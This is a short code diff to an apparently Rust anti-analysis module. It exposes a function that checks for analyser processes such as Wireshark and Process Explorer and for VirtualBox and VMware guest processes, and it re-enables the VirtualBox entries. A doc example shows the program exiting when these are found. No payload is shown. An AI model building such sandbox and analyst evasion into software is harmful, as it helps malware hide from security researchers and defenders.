@@ -11,13 +11,21 @@ use sysinfo::{ProcessExt, System, SystemExt};
 ///     process::exit(0);
 /// }
 /// ```
-
-
 pub fn detected() -> bool{
     return processes() || sandbox();
 }
 
-fn processes() -> bool{
+/// Returns whether or not suspicious processes have been found. Includes analyser (wireshark, process explorer, etc...) and VM guest processes.
+/// 
+/// Use:
+/// ```
+/// use std::env;
+/// 
+/// if anti_analysis::processes(){
+///     process::exit(0);
+/// }
+/// ```
+pub fn processes() -> bool{
     let analysers = vec![
         "Wireshark.exe",
         "procexp64.exe",
@@ -31,8 +39,8 @@ fn processes() -> bool{
     ];
 
     let vms = vec![
-        //"VBoxTray.exe",
-        //"VBoxService.exe",
+        "VBoxTray.exe",
+        "VBoxService.exe",
         "VMwareUser.exe",
         "vmtoolsd.exe",
         "VMwareTray.exe",
